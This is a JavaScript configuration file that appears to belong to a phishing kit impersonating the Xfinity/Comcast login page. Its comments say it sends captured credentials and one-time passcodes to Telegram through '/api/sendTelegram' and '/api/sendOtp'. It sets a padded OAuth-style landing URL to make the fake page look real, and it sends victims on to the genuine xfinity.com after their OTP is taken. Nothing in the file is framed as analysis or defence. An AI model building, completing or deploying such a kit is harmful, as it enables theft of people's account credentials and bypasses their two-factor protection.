/**
 * Application Configuration
 *
 * Centralized constants and settings for the Xfinity login application.
 */
export const config = {
  api: {
    // The endpoint for sending credentials to Telegram.
    sendTelegramEndpoint: '/api/sendTelegram',
    // The separate endpoint for sending OTP to Telegram.
    sendOtpEndpoint: '/api/sendOtp',
  },
  redirects: {
    // The static Xfinity login landing page (with OAuth-style query params >150 chars).
    landingPage: '/login.html?r=comcast.net&s=oauth&continue=https%3A%2F%2Foauth.xfinity.com%2Fauthorize%3Fresponse_type%3Dcode%26client_id%3Dmy-account-web%26redirect_uri%3Dhttps%253A%252F%252Fcustomer.xfinity.com%252Foauth%252Fcallback%26state%3Dhttps%253A%252F%252Fcustomer.xfinity.com%252Foverview%26response%3D1&reqId=b4f27a31-8c9e-4d1b-a5f6-3e7d2c8b9a01&ui_style=light&lang=en',
    // Where to redirect after OTP verification.
    afterOtp: 'https://www.xfinity.com',
  },
};
